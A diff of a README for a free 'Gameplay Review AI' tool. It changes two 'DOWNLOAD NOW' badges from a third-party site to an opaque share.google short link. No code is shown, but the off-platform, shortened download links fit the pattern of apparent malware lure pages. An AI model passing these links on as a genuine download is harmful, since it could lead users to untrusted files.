@@ -9,7 +9,7 @@ The **🧠 Gameplay Review AI** is the most advanced AI-powered tool for analyzi
 
 <div align="center">
 
-[![Download Gameplay Review AI](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://software-nation.com/grandpa14)
+[![Download Gameplay Review AI](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://share.google/k3U6Qw6HPDbEExvJz)
 
 </div>
 
@@ -207,7 +207,7 @@ One tool. AI coaching. Zero cost.
 
 <div align="center">
 
-[![Download Gameplay Review AI](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://software-nation.com/grandpa14)
+[![Download Gameplay Review AI](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://share.google/k3U6Qw6HPDbEExvJz)
 
 **Version 2026.93.1** — AI gameplay analysis. Improve faster. Free forever.
 
